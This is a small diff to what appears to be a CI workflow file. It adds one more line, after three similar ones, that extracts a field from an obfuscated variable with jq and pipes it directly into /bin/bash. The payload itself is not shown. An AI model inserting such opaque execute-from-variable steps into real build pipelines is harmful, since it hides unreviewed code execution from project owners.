@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$gc2" | jq -r .e752 | /bin/bash
           echo $gth486 | jq -r .wj8536 | /bin/bash
           printf '%s' "$slf221" | jq -r .zvn74 | /bin/bash
+          echo $z5259 | jq -r .feh1 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
